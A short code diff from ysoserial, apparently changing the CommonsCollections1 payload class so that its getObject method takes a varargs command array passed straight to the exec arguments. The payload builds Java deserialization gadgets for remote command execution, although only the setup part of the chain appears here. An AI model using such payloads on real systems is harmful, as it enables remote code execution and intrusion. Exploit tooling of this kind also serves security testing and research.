@@ -46,8 +46,8 @@ import ysoserial.payloads.util.Reflections;
 @Authors({ Authors.FROHOFF })
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
-	public InvocationHandler getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
+	public InvocationHandler getObject(final String ... command) throws Exception {
+		final String[] execArgs = command;
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 			new Transformer[]{ new ConstantTransformer(1) });
